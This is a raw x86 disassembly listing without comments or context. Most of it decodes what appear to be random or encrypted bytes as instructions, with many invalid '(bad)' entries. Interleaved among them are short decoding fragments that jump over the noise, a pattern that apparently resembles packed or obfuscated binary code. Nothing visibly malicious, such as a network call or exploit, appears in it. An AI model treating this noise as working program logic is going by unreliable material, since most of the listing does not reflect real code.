  40495f:	jmp    0xf0c0:0x73ffdc11
  404966:	dec    esp
  404967:	rol    cl,cl
  404969:	push   edi
  40496a:	xor    al,0x66
  40496c:	jbe    0x4048f4
  40496e:	add    ebx,ecx
  404970:	jne    0x4049d3
  404972:	push   ss
  404973:	pop    esp
  404974:	rol    DWORD PTR [edx-0x24],1
  404977:	adc    BYTE PTR [edx+ebx*8],bl
  40497a:	pop    ss
  40497b:	add    edx,DWORD PTR [ebx+ecx*2+0x6b]
  40497f:	rcr    BYTE PTR [ebx-0x59362782],0x58
  404986:	mov    ebx,0x7e6b6b3a
  40498b:	or     BYTE PTR [ecx],cl
  40498d:	ja     0x404932
  40498f:	mov    edi,0x772f5597
  404994:	aaa    
  404995:	mov    cs:0x9d6082a3,eax
  40499b:	mov    dl,0x97
  40499d:	add    eax,0x36191ead
  4049a2:	cmp    DWORD PTR [ecx-0x7f253628],edi
  4049a8:	stos   BYTE PTR es:[edi],al
  4049a9:	mov    dl,BYTE PTR [edx+0x7d]
  4049ac:	or     al,0xc4
  4049ae:	adc    ch,BYTE PTR [ebp-0x1c090722]
  4049b4:	jmp    0x4d1f:0x42363f44
  4049bb:	mov    ecx,0xb493d8e1
  4049c0:	xor    edx,eax
  4049c2:	add    edx,DWORD PTR [ebp-0x14]
  4049c5:	jmp    0x404b6f
  4049ca:	test   BYTE PTR [ebp-0x13],cl
  4049cd:	xor    edi,ebp
  4049cf:	push   ebx
  4049d0:	mov    esp,0xd1280b5d
  4049d5:	xor    DWORD PTR [edx-0x6eedcf69],ebx
  4049db:	sub    al,0x7e
  4049dd:	jle    0x40496a
  4049df:	jg     0x404a5f
  4049e1:	jle    0x404989
  4049e3:	cmc    
  4049e4:	sub    eax,0xaf3c61a3
  4049e9:	ins    BYTE PTR es:[edi],dx
  4049ea:	jae    0x40499b
  4049ec:	jecxz  0x404a49
  4049ee:	call   0xc8b03462
  4049f3:	stos   DWORD PTR es:[edi],eax
  4049f4:	inc    eax
  4049f5:	rol    BYTE PTR [edi],1
  4049f7:	fst    QWORD PTR [ecx-0x10]
  4049fa:	push   ds
  4049fb:	retf   
  4049fc:	arpl   WORD PTR [eax-0x32e498fe],si
  404a02:	and    DWORD PTR [edx],esi
  404a04:	xlat   BYTE PTR ds:[ebx]
  404a05:	cld    
  404a06:	jns    0x4049ae
  404a08:	pushf  
  404a09:	add    al,0x99
  404a0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a0c:	test   al,0x26
  404a0e:	jns    0x4049e5
  404a10:	repnz mov esi,eax
  404a13:	jns    0x4049f5
  404a15:	add    esp,esp
  404a17:	dec    edi
  404a18:	iret   
  404a19:	retf   
  404a1a:	xchg   ebx,eax
  404a1b:	addr16 js 0x404a63
  404a1e:	mov    ah,0x80
  404a20:	add    BYTE PTR [eax+edx*1-0x38683227],dl
  404a27:	fld    QWORD PTR [esi]
  404a29:	fwait
  404a2a:	(bad)  
  404a2b:	xor    DWORD PTR [edx-0x2f],esp
  404a2e:	add    DWORD PTR [eax-0x5d],ebx
  404a31:	out    dx,eax
  404a32:	lahf   
  404a33:	xlat   BYTE PTR ds:[ebx]
  404a34:	and    eax,0x5ed0a51e
  404a39:	stc    
  404a3a:	jp     0x4049d5
  404a3c:	mov    ds:0x44a88b51,eax
  404a41:	add    eax,0x492059dc
  404a46:	ins    DWORD PTR es:[edi],dx
  404a47:	daa    
  404a48:	mov    BYTE PTR [ebp+0x4b],al
  404a4b:	or     cl,dh
  404a4d:	add    BYTE PTR [ebp-0x26],al
  404a50:	lods   al,BYTE PTR ds:[esi]
  404a51:	mov    ebx,0x1640899a
  404a56:	mov    ds:0xb51dd54f,eax
  404a5b:	push   edx
  404a5c:	xor    ch,BYTE PTR [eax-0x29a7a13e]
  404a62:	pop    esi
  404a63:	popa   
  404a64:	clc    
  404a65:	jae    0x404a42
  404a67:	imul   esp,DWORD PTR [ebx-0x5269997f],0xffffffd7
  404a6e:	(bad)  
  404a6f:	dec    eax
  404a70:	stos   DWORD PTR es:[edi],eax
  404a71:	or     al,0x5b
  404a73:	rcl    DWORD PTR [eax-0x4b],1
  404a76:	xor    eax,DWORD PTR [edi]
  404a78:	push   edx
  404a79:	adc    ebp,DWORD PTR [ebp+0x2bcaa81b]
  404a7f:	jecxz  0x404a2b
  404a81:	sub    eax,0x8d7473f3
  404a86:	(bad)  
  404a88:	mov    ebx,0xfde4613f
  404a8d:	(bad)  
  404a8f:	inc    ebx
  404a90:	dec    eax
  404a91:	xor    DWORD PTR [ebp*4-0x1646c363],edi
  404a98:	call   0x33ea:0x5ee63f8
  404a9f:	out    0xf3,al
  404aa1:	daa    
  404aa2:	cmc    
  404aa3:	mov    cl,al
  404aa5:	fisubr WORD PTR [ecx+edi*1-0x379856dc]
  404aac:	mov    ?,WORD PTR [edx-0x62]
  404aaf:	ror    DWORD PTR [ebx],cl
  404ab1:	sahf   
  404ab2:	pop    edx
  404ab3:	cmp    eax,0x1b3ebf49
  404ab8:	inc    esp
  404ab9:	inc    eax
  404aba:	inc    edi
  404abb:	pop    ebx
  404abc:	mov    ah,0x9c
  404abe:	test   eax,0x9620fd19
  404ac3:	or     al,0xed
  404ac5:	ss addr16 adc dl,dh
  404ac9:	mov    dl,0x25
  404acb:	push   0x8ecef915
  404ad0:	bound  ecx,QWORD PTR [eax-0x2147220d]
  404ad6:	sbb    al,0xa
  404ad8:	mov    dl,ah
  404ada:	xor    al,0x3f
  404adc:	push   ebp
  404add:	cmp    eax,0xe0f3c88c
  404ae2:	gs push ebp
  404ae4:	xchg   ecx,eax
  404ae5:	fiadd  WORD PTR [eax+edi*1-0x66]
  404ae9:	push   ds
  404aea:	ret    0xc10e
  404aed:	and    esp,edi
  404aef:	out    0x9a,al
  404af1:	sub    eax,0xe4331f28
  404af6:	and    BYTE PTR [edi-0x19e7faae],cl
  404afc:	ins    BYTE PTR es:[edi],dx
  404afd:	les    esp,FWORD PTR [ebp-0x65fa0867]
  404b03:	xchg   DWORD PTR ds:0x75bbb78d,ebp
  404b09:	cld    
  404b0a:	and    eax,0x150c015e
  404b0f:	push   cs
  404b10:	pop    edi
  404b11:	lods   eax,DWORD PTR ds:[esi]
  404b12:	jmp    0x13f355cc
  404b17:	cld    
  404b18:	sub    al,0x0
  404b1a:	inc    eax
  404b1b:	adc    BYTE PTR [edx],dh
  404b1d:	push   eax
  404b1e:	xchg   edx,eax
  404b1f:	dec    edi
  404b20:	out    dx,al
  404b21:	jne    0x404b59
  404b23:	jo     0x404b31
  404b25:	push   ebx
  404b26:	dec    esp
  404b27:	cs inc edi
  404b29:	stos   BYTE PTR es:[edi],al
  404b2a:	loopne 0x404b10
  404b2c:	scas   eax,DWORD PTR es:[edi]
  404b2d:	mov    esp,0xfd532e6b
  404b32:	rol    BYTE PTR [ebp+0x545d9a1e],cl
  404b38:	cmp    eax,0x8d0fa9f2
  404b3d:	add    BYTE PTR [edx-0x77be7403],0x94
  404b44:	inc    esp
  404b45:	test   BYTE PTR [edx],cl
  404b47:	push   edi
  404b48:	gs cld 
  404b4a:	stos   BYTE PTR es:[edi],al
  404b4b:	lods   eax,DWORD PTR ds:[esi]
  404b4c:	push   eax
  404b4d:	mov    bh,0xcc
  404b4f:	hlt    
  404b50:	out    dx,eax
  404b51:	inc    eax
  404b52:	or     eax,0x8528183b
  404b57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b58:	mov    ebp,0xc2ac4d72
  404b5d:	jno    0x404aea
  404b5f:	mov    ebx,DWORD PTR [ebp-0x39]
  404b62:	mov    dh,0x54
  404b64:	mov    edi,0x4018ab92
  404b69:	daa    
  404b6a:	int    0x13
  404b6c:	repnz pop ebp
  404b6e:	lds    ecx,FWORD PTR [ebx-0x6b751b83]
  404b74:	cmp    bl,BYTE PTR [ebp-0x77ffcd8e]
  404b7a:	push   ebp
  404b7b:	or     ecx,DWORD PTR [edx+0x7d8b0f55]
  404b81:	hlt    
  404b82:	xor    edi,eax
  404b84:	add    edi,DWORD PTR [ebp-0x14]
  404b87:	jmp    0x404d31
  404b8c:	in     al,dx
  404b8d:	push   esi
  404b8e:	adc    dh,BYTE PTR [eax+0x6a6c4c94]
  404b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b95:	(bad)  
  404b96:	aas    
  404b97:	push   eax
  404b98:	les    ecx,FWORD PTR [esi+0x2e2eade2]
  404b9e:	jle    0x404c1e
  404ba0:	mov    edi,DWORD PTR [edi+0x7e]
  404ba3:	jle    0x404bac
  404ba5:	and    edx,eax
  404ba7:	ret    0xcdd2
  404baa:	rcr    DWORD PTR [ebx-0x74d79d0b],cl
  404bb0:	lock sbb eax,DWORD PTR [edi+0x48b2bf19]
  404bb7:	cmp    DWORD PTR [edx-0x4dad62d4],edx
  404bbd:	push   edi
  404bbe:	aad    0xd0
  404bc0:	jb     0x404c3c
  404bc2:	inc    ebp
  404bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bc4:	jne    0x404bd7
  404bc6:	xchg   edx,eax
  404bc7:	out    0x7e,al
  404bc9:	fstp   DWORD PTR [edi+edx*8+0x65]
  404bcd:	imul   ebx,DWORD PTR [esi],0xffffffd1
  404bd0:	aaa    
  404bd1:	adc    al,0xf
  404bd3:	dec    esp
  404bd4:	and    ebx,DWORD PTR [ebx]
  404bd6:	xor    bh,BYTE PTR [eax-0x3c]
  404bd9:	std    
  404bda:	ret    
  404bdb:	je     0x404be2
  404bdd:	add    esi,ecx
  404bdf:	mov    esp,0xdc54caf3
  404be4:	inc    ecx
  404be5:	pop    ebp
  404be6:	push   0xe78c63a1
  404beb:	push   eax
  404bec:	pushf  
  404bed:	adc    BYTE PTR [esi-0x72],dh
  404bf0:	(bad)  
  404bf1:	push   0x41
  404bf3:	jmp    0x2e84d9e9
  404bf8:	out    dx,al
  404bf9:	xchg   edx,eax
  404bfa:	clc    
  404bfb:	xchg   edi,eax
  404bfc:	retf   
  404bfd:	aaa    
  404bfe:	call   0xe54abba4
  404c03:	and    dh,BYTE PTR [ecx+0x2f]
  404c06:	mov    esp,0xc61bd698
  404c0b:	lods   eax,DWORD PTR ds:[esi]
  404c0c:	test   al,0x4f
  404c0e:	xlat   BYTE PTR ds:[ebx]
  404c0f:	cld    
  404c10:	dec    ebp
  404c11:	leave  
  404c12:	rep outs dx,DWORD PTR ds:[esi]
  404c14:	sbb    al,0xd7
  404c16:	jb     0x404c44
  404c18:	xor    esp,DWORD PTR [ebx]
  404c1a:	sub    esi,DWORD PTR [ecx]
  404c1c:	pusha  
  404c1d:	stos   BYTE PTR es:[edi],al
  404c1e:	mov    eax,0x4c7ad7bd
  404c23:	pop    ebx
  404c24:	xchg   esp,esp
  404c26:	rcr    DWORD PTR [esi-0x56],cl
  404c29:	mov    edi,0xfee643b
  404c2e:	push   esp
  404c2f:	int3   
  404c30:	xchg   ebp,eax
  404c31:	add    BYTE PTR [ecx+0xc90cad7],ah
  404c37:	push   ss
  404c38:	cmp    dh,BYTE PTR [esi-0x5c]
  404c3b:	es push ecx
  404c3d:	popa   
  404c3e:	scas   eax,DWORD PTR es:[edi]
  404c3f:	jmp    0x97c3c4f9
  404c44:	popa   
  404c45:	dec    ecx
  404c46:	fdivr  QWORD PTR [edx]
  404c48:	and    ebp,DWORD PTR [ebx+0xc]
  404c4b:	stos   BYTE PTR es:[edi],al
  404c4c:	aam    0xc2
  404c4e:	inc    ebx
  404c4f:	shl    BYTE PTR [ebx],1
  404c51:	arpl   dx,cx
  404c53:	icebp  
  404c54:	push   esi
  404c55:	mov    ds:0x894a5378,eax
  404c5a:	stc    
  404c5b:	cli    
  404c5c:	aas    
  404c5d:	or     BYTE PTR [ebp+0x3a],0x8d
  404c61:	dec    ebx
  404c62:	test   DWORD PTR ds:0xfa58f882,0x4fb10ebd
  404c6c:	pop    ebx
  404c6d:	push   es
  404c6e:	in     al,0xa4
  404c70:	sub    al,ch
  404c72:	shl    BYTE PTR [eax+0x46],1
  404c75:	ficom  DWORD PTR [ecx+0x6d]
  404c78:	les    eax,FWORD PTR [ebp-0x4cdcf27d]
  404c7e:	cli    
  404c7f:	jb     0x404cfb
  404c81:	sahf   
  404c82:	ds hlt 
  404c84:	or     eax,0xa57d88a9
  404c89:	inc    esp
  404c8a:	xchg   DWORD PTR [ebx],ebp
  404c8c:	sub    eax,0xa798ab45
  404c91:	inc    ecx
  404c92:	push   ds
  404c93:	in     eax,0x6
  404c95:	stc    
  404c96:	iretw  
  404c98:	repz jecxz 0x404c70
  404c9b:	cld    
  404c9c:	xor    al,0x99
  404c9e:	fs pop ebp
  404ca0:	mov    al,0x48
  404ca2:	sub    ecx,DWORD PTR [eax+0x8980b29]
  404ca8:	pop    es
  404ca9:	pop    edx
  404cab:	push   esp
  404cac:	fisttp DWORD PTR [edx]
  404cae:	sub    eax,0xb468cbc1
  404cb3:	inc    ebx
  404cb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cb5:	sbb    DWORD PTR [esi],ebp
  404cb7:	xchg   esi,eax
  404cb8:	cld    
  404cb9:	cdq    
  404cba:	mov    edi,0x9f80a78d
  404cbf:	scas   eax,DWORD PTR es:[edi]
  404cc0:	cmc    
  404cc1:	(bad)  
  404cc2:	jmp    0x1d1d8c13
  404cc7:	mov    ch,0x38
  404cc9:	or     esp,DWORD PTR [ecx]
  404ccb:	mov    al,BYTE PTR [esi+0x5c]
  404cce:	sub    bl,al
  404cd0:	gs (bad) 
  404cd2:	fucomip st,st(3)
  404cd4:	ds push ebx
  404cd6:	hlt    
  404cd7:	pop    es
  404cd8:	loope  0x404c7e
  404cda:	js     0x70e11a4e
  404ce0:	jo     0x404cda
  404ce2:	mov    ebx,0xa9201bbb
  404ce7:	int3   
  404ce8:	mov    dl,0x39
  404cea:	pop    ss
  404ceb:	add    esp,DWORD PTR [ebp-0x1e6f9975]
  404cf1:	fnstenv [edi+esi*8]
  404cf4:	and    DWORD PTR [ebx+0x29],eax
  404cf7:	pop    ss
  404cf8:	jne    0x404cc3
  404cfa:	mov    esp,0x27a3485f
  404cff:	add    DWORD PTR [ebp-0x16],ecx
  404d02:	or     eax,0x6f7dc478
  404d07:	or     ebp,ecx
  404d09:	and    esi,esp
  404d0b:	jb     0x404d08
  404d0d:	in     al,dx
  404d0e:	loopne 0x404d68
  404d10:	sub    DWORD PTR [eax+ebx*1],edx
  404d13:	call   0xb665:0x70d77c4f
  404d1a:	test   eax,0x67b24672
  404d1f:	or     esi,DWORD PTR [edi-0x2ce018a3]
  404d25:	xor    BYTE PTR [esi],dl
  404d27:	push   ebp
  404d28:	out    dx,eax
  404d29:	mov    bl,0x6f
  404d2b:	je     0x404d17
  404d2d:	push   es
  404d2e:	jg     0x404d92
  404d30:	lods   al,BYTE PTR ds:[esi]
  404d31:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d34:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d3b:	mov    dl,BYTE PTR [ebp+0xb]
  404d3e:	mov    edi,DWORD PTR [ebp-0x18]
  404d41:	xor    edi,eax
  404d43:	add    edi,DWORD PTR [ebp-0x14]
  404d46:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d49:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d50:	mov    edx,DWORD PTR [ebp-0x44]
  404d53:	mov    edi,DWORD PTR [ebp-0xc]
  404d56:	xor    edx,eax
  404d58:	xor    edi,eax
  404d5a:	add    edx,ecx
  404d5c:	add    edi,ecx
  404d5e:	imul   edx,edi
  404d61:	add    edx,DWORD PTR [ebp-0x14]
  404d64:	mov    DWORD PTR [ebp-0x14],edx
  404d67:	mov    edx,DWORD PTR [ebp-0xc]
  404d6a:	mov    edi,DWORD PTR [ebp-0x24]
  404d6d:	xor    edx,eax
  404d6f:	add    edx,ecx
  404d71:	imul   edx,edi
  404d74:	mov    edi,DWORD PTR [ebp-0xc]
  404d77:	xor    edi,eax
  404d79:	sub    edx,edi
  404d7b:	mov    edi,DWORD PTR [ebp-0xc]
  404d7e:	mov    ebx,DWORD PTR [ebp-0x14]
  404d81:	jmp    0x404f2b
  404d86:	test   DWORD PTR [ebp+0x21bc10ba],0xf561ad9d
  404d90:	xchg   ebp,eax
  404d91:	and    BYTE PTR [ebx-0x1f],dl
  404d94:	sbb    eax,0x7e2fbbfa
  404d99:	jle    0x404d26
  404d9b:	jg     0x404e1b
  404d9d:	jle    0x404df2
  404d9f:	or     BYTE PTR [edx+edx*2+0x7b],dl
  404da3:	inc    esp
  404da4:	or     cl,BYTE PTR [ebp+0x5e]
  404da7:	shr    edx,1
  404da9:	push   ebp
  404daa:	or     ah,al
  404dac:	cmp    cl,bl
  404dae:	xchg   BYTE PTR ds:0x1d6e368f,cl
  404db4:	xchg   edi,eax
  404db5:	into   
  404db6:	push   0xd26cbaef
  404dbb:	jo     0x404da3
  404dbd:	mov    cl,dh
  404dbf:	push   edi
  404dc0:	loope  0x404d4f
  404dc2:	push   es
  404dc3:	adc    BYTE PTR [ebp-0x65],dh
  404dc6:	shl    BYTE PTR [eax+0x65],1
  404dc9:	(bad)  
  404dca:	mul    DWORD PTR [ebx-0x2b]
  404dcd:	jmp    0x4e7539f1
  404dd2:	pop    eax
  404dd3:	stos   DWORD PTR es:[edi],eax
  404dd4:	jns    0x404d6b
  404dd6:	pop    esp
  404dd7:	jecxz  0x404db6
  404dd9:	fdivr  QWORD PTR [esi-0x29869a28]
  404ddf:	jne    0x404d99
  404de1:	inc    ebp
  404de2:	dec    esi
  404de3:	xor    al,0xa5
  404de5:	jae    0x404d9a
  404de7:	xchg   DWORD PTR [edi+ecx*4-0x22],ebx
  404deb:	xchg   ebx,eax
  404dec:	clc    
  404ded:	or     DWORD PTR [ebp+eiz*1+0x2d806ef2],edx
  404df4:	or     al,dl
  404df6:	mov    edx,0x9f1b366d
  404dfb:	xchg   esi,eax
  404dfc:	push   cs
  404dfd:	or     DWORD PTR [esi+0x14e33ca1],edx
  404e03:	push   ebp
  404e04:	mov    edx,0xbb175f30
  404e09:	in     al,dx
  404e0a:	push   esi
  404e0b:	push   ebx
  404e0c:	in     eax,dx
  404e0d:	scas   eax,DWORD PTR es:[edi]
  404e0e:	sub    eax,eax
  404e10:	stos   BYTE PTR es:[edi],al
  404e11:	add    al,0x63
  404e13:	mov    dl,al
  404e15:	sub    eax,0xdf2bd38f
  404e1a:	retf   
  404e1b:	inc    ebx
  404e1c:	mov    ?,ebp
  404e1e:	call   0xf161ac8
  404e23:	ret    
  404e24:	inc    edi
  404e25:	int    0xde
  404e27:	les    esp,FWORD PTR [eax-0x1236d9c3]
  404e2d:	mov    dl,0xbd
  404e2f:	inc    eax
  404e30:	jmp    0x404dd4
  404e32:	add    BYTE PTR [edx],0x81
  404e35:	jmp    0x404e94
  404e37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e38:	(bad)  
  404e39:	loopne 0x404e6a
  404e3b:	sbb    eax,0xcf5d598c
  404e40:	mov    ah,0xb0
  404e42:	data16 fidiv DWORD PTR [ecx]
  404e45:	jl     0x404de5
  404e47:	ret    
  404e48:	mov    al,0x42
  404e4a:	rcl    BYTE PTR [ecx-0x7],cl
  404e4d:	cmp    al,0x1b
  404e4f:	sbb    edi,0x14
  404e52:	xchg   edx,eax
  404e53:	addr16 cld 
  404e55:	jge    0x404def
  404e57:	cld    
  404e58:	mov    cl,0x6a
  404e5a:	lahf   
  404e5b:	bound  eax,QWORD PTR [edx-0x1]
  404e5e:	push   ebx
  404e5f:	sbb    BYTE PTR [esi],0x38
  404e62:	test   al,0x45
  404e64:	cwde   
  404e65:	(bad)  
  404e67:	pop    ds
  404e68:	test   DWORD PTR [edi],edx
  404e6a:	or     BYTE PTR [ebp+0x70b634c4],0x7c
  404e71:	sbb    esp,edi
  404e73:	sbb    eax,0x1d10dd12
  404e78:	syscall 
  404e7a:	(bad)  
  404e7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e7c:	and    edx,DWORD PTR [eax-0xe]
  404e7f:	jbe    0x404e49
  404e81:	(bad)  
  404e82:	push   cs
  404e83:	pop    ecx
  404e84:	ret    0xcbb2
  404e87:	sti    
  404e88:	outs   dx,BYTE PTR ds:[esi]
  404e89:	push   0x49
  404e8b:	pop    ebx
  404e8c:	pop    ds
  404e8d:	jge    0x404efd
  404e8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e90:	cdq    
  404e91:	outs   dx,BYTE PTR ds:[esi]
  404e92:	loope  0x404ee2
  404e94:	mov    dh,0x81
  404e96:	scas   eax,DWORD PTR es:[edi]
  404e97:	and    al,0x78
  404e99:	mov    esi,0xf3ed0375
  404e9e:	test   DWORD PTR [eax],edx
  404ea0:	out    0x11,eax
  404ea2:	adc    esi,DWORD PTR [esi]
  404ea4:	pop    esp
  404ea5:	std    
  404ea6:	js     0x404e73
  404ea8:	jge    0x404e95
  404eaa:	sbb    BYTE PTR [ecx-0x78796a1b],al
  404eb0:	loopne 0x404e63
  404eb2:	jecxz  0x404e6a
  404eb4:	lock jl 0x404eb2
  404eb7:	mov    ecx,0x1af2f1cb
  404ebc:	jnp    0x404ed0
  404ebe:	data16 adc BYTE PTR fs:[ebp+0x39059b3d],bl
  404ec6:	jbe    0x404e4d
  404ec8:	cmp    cl,ch
  404eca:	push   eax
  404ecb:	ds sub eax,0x7e39f6fa
  404ed1:	hlt    
  404ed2:	ss (bad) 
  404ed4:	aaa    
  404ed5:	in     eax,dx
  404ed6:	adc    DWORD PTR [ecx+0x76],0xffffffb4
  404eda:	fstp   st(7)
  404edc:	test   eax,0x93e09f76
  404ee1:	shl    DWORD PTR ds:0xeb690ffb,cl
  404ee7:	add    edx,DWORD PTR ss:[ecx+eax*8+0xc80dd0d]
  404eef:	mov    ah,0x2c
  404ef1:	xor    dl,BYTE PTR [ecx-0x1942e8e4]
  404ef7:	mov    bl,0xb8
  404ef9:	cmp    al,ch
  404efb:	jle    0x404eb7
  404efd:	popa   
  404efe:	jl     0x404f40
  404f00:	jnp    0x404ed5
  404f02:	push   eax
  404f03:	mov    eax,0x4b2630b3
  404f08:	test   DWORD PTR [esp+ebx*4+0x63b87cfa],ebp
  404f0f:	aaa    
  404f10:	popf   
  404f11:	pop    ss
  404f12:	dec    edx
  404f13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f14:	repnz mov ch,0x18
  404f17:	sub    ecx,ebx
  404f19:	hlt    
  404f1a:	rol    dl,1
  404f1c:	jae    0x404f31
  404f1e:	ins    BYTE PTR es:[edi],dx
  404f1f:	lock xor eax,0x5500f0f4
  404f25:	lods   eax,DWORD PTR ds:[esi]
  404f26:	and    cl,0x11
  404f29:	cs call 0xf9444762
  404f2f:	imul   edi,ebx
  404f32:	jmp    0x4050dc
  404f37:	mov    esp,0xfaa10ab4
  404f3c:	jns    0x404efb
  404f3e:	dec    ebp
  404f3f:	mov    edx,0x25d15a29
  404f44:	scas   eax,DWORD PTR es:[edi]
  404f45:	call   0x8b7e:0x7e21c879
  404f4c:	jg     0x404fcc
  404f4e:	jle    0x404f03
  404f50:	add    al,0x65
  404f52:	(bad)  
  404f53:	ss repnz retf 
  404f56:	xor    al,0xe5
  404f58:	loope  0x404f56
  404f5a:	bound  ebp,QWORD PTR [esi]
  404f5c:	sbb    DWORD PTR [edx-0x11],esp
  404f5f:	out    dx,al
  404f60:	sub    DWORD PTR [eax],esi
  404f62:	jmp    0x63c2:0x342b80cb
  404f69:	popf   
  404f6a:	(bad)  
  404f6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f6d:	push   ss
  404f6e:	mov    cl,0x26
  404f70:	scas   al,BYTE PTR es:[edi]
  404f71:	jne    0x404f15
  404f73:	sbb    edi,DWORD PTR [ebx-0xb]
  404f76:	stc    
  404f77:	cld    
  404f78:	jge    0x404f30
  404f7a:	push   es
  404f7b:	fcmovnb st,st(3)
  404f7e:	sti    
  404f7f:	aaa    
  404f80:	enter  0x2b06,0x14
  404f84:	popa   
  404f85:	int    0x7
  404f87:	scas   al,BYTE PTR es:[edi]
  404f88:	add    eax,DWORD PTR [eax]
  404f8a:	dec    ebp
  404f8b:	call   0xf63:0xa9678801
  404f92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f93:	ret    
  404f94:	push   edi
  404f95:	pop    ebx
  404f96:	(bad)  
  404f97:	les    esp,FWORD PTR [edi]
  404f99:	aad    0xe7
  404f9b:	ret    
  404f9c:	jl     0x404fd2
  404f9e:	fadd   QWORD PTR [ecx+eax*1]
  404fa1:	cmp    BYTE PTR [edi-0x35f558f5],0x9d
  404fa8:	aad    0x78
  404faa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fab:	lahf   
  404fac:	cli    
  404fad:	(bad)  
  404fae:	cmc    
  404faf:	jecxz  0x40501a
  404fb1:	jbe    0x404f51
  404fb3:	pop    esp
  404fb4:	daa    
  404fb5:	adc    ebx,ecx
  404fb7:	sbb    al,0xfd
  404fb9:	test   DWORD PTR [edi+eiz*8+0x35],edi
  404fbd:	cmp    ch,BYTE PTR [ebp+edx*8-0x59]
  404fc1:	shr    DWORD PTR [edi-0x4f74f17a],cl
  404fc7:	test   al,0xc9
  404fc9:	out    dx,eax
  404fca:	sub    al,0x7d
  404fcc:	dec    bl
  404fce:	or     bh,0xf8
  404fd1:	in     al,0x93
  404fd3:	loopne 0x40503c
  404fd5:	pop    edi
  404fd6:	stc    
  404fd7:	aaa    
  404fd8:	sar    DWORD PTR [eax],0xf8
  404fdb:	frstor [ebx-0x82691ca]
  404fe1:	sbb    eax,0xc366072a
  404fe6:	das    
  404fe7:	sahf   
  404fe8:	arpl   WORD PTR [esi],cx
  404fea:	gs test esp,ebp
  404fed:	mov    ebp,0xe19fe1e0
  404ff2:	(bad)  
  404ff3:	jo     0x404fba
  404ff5:	adc    DWORD PTR [ebx+edi*1-0x2a],ecx
  404ff9:	adc    ebx,DWORD PTR [edi-0x60487d6a]
  404fff:	sub    DWORD PTR [esi],edi
  405001:	test   ah,cl
  405003:	ficom  WORD PTR [ecx-0x7d5c6cff]
  405009:	jno    0x404fbc
  40500b:	pop    ss
  40500c:	cld    
  40500d:	or     esp,DWORD PTR [edi]
  40500f:	test   DWORD PTR [ebx-0x72caebc],esi
  405015:	aam    0xb9
  405017:	dec    DWORD PTR [ecx-0x74220340]
  40501d:	adc    DWORD PTR [esp+ebx*2+0x6b],ebp
  405021:	inc    eax
  405022:	call   0x8e3b3c01
  405027:	lds    esi,FWORD PTR [ebx+edx*4]
  40502a:	cmp    eax,DWORD PTR [ebp+0x41]
  40502d:	outs   dx,BYTE PTR ds:[esi]
  40502e:	fist   DWORD PTR [ebp-0x3f60424d]
  405034:	and    dl,dl
  405036:	push   ebx
  405037:	adc    BYTE PTR [edx],bl
  405039:	xor    DWORD PTR [esi+ebx*8-0x38],esp
  40503d:	pop    ss
  40503e:	clc    
  40503f:	inc    ebx
  405040:	mov    ?,WORD PTR [edx+0x190ea76f]
  405046:	test   DWORD PTR [ecx-0x40],edx
  405049:	jae    0x405084
  40504b:	je     0x405010
  40504d:	adc    BYTE PTR [eax-0x2],dl
  405050:	xor    eax,0x6729016f
  405055:	jmp    DWORD PTR [esi+ebx*2]
  405058:	cwde   
  405059:	push   es
  40505a:	or     DWORD PTR [ebp+0xe],0xee04fd3a
  405061:	xchg   ebx,eax
  405062:	mov    dl,0x6b
  405064:	leave  
  405065:	aad    0xf3
  405067:	sahf   
  405068:	imul   ebx,ebp,0xb2dca689
  40506e:	and    edi,ecx
  405070:	pushf  
  405071:	mov    bl,0xf2
  405073:	cmp    ch,BYTE PTR [ecx-0x64a168c8]
  405079:	popf   
  40507a:	dec    esi
  40507b:	add    DWORD PTR fs:[edx-0x5374f99d],esi
  405082:	jl     0x40506b
  405084:	pop    esp
  405085:	retf   0x76d9
  405088:	imul   ebx,DWORD PTR [ecx+0x1c8f5273],0x5f1a8b3b
  405092:	sbb    DWORD PTR [ecx+0x56b0c1ba],esp
  405098:	cmp    ecx,DWORD PTR [edi+0x461590ce]
  40509e:	mov    gs:0x500cf3ba,al
  4050a4:	in     eax,0x73
  4050a6:	ds pop ss
  4050a8:	pop    esp
  4050a9:	stc    
  4050aa:	(bad)  
  4050ab:	cmp    bh,BYTE PTR [eax+ecx*1-0x77ee290c]
  4050b2:	clc    
  4050b3:	lahf   
  4050b4:	test   eax,0x56a62d9e
  4050b9:	loop   0x40509a
  4050bb:	push   ss
  4050bc:	jg     0x4050c9
  4050be:	comiss xmm2,DWORD PTR [ecx+0x7deb14de]
  4050c5:	mov    edi,DWORD PTR [ebx]
  4050c7:	lea    edx,[ebp+esi*1+0x6c]
  4050cb:	popa   
  4050cc:	loope  0x4050ed
  4050ce:	(bad)  
  4050cf:	jle    0x405089
  4050d1:	loop   0x405127
  4050d3:	mov    bl,0xa3
  4050d5:	xchg   edi,eax
  4050d6:	cmp    eax,0x9e910d91
  4050db:	or     BYTE PTR [ebx-0x27cc17a3],0x2b
  4050e2:	ror    DWORD PTR [ebp+0x729d1fbc],1
  4050e8:	xor    al,BYTE PTR [eax]
  4050ea:	cmp    edi,edx
  4050ec:	jbe    0x404654
  4050f2:	mov    edx,DWORD PTR [ebp-0xc]
  4050f5:	mov    edi,DWORD PTR [ebp-0x24]
  4050f8:	xor    edx,eax
  4050fa:	add    edx,ecx
  4050fc:	jmp    0x4052a6
  405101:	pop    edi
  405102:	mov    DWORD PTR [ebp+ebx*8-0x42980294],edx
  405109:	sbb    al,0x25
  40510b:	or     ebx,ecx
  40510d:	test   eax,0x450d47d2
  405112:	and    bh,BYTE PTR [esi+0x7e]
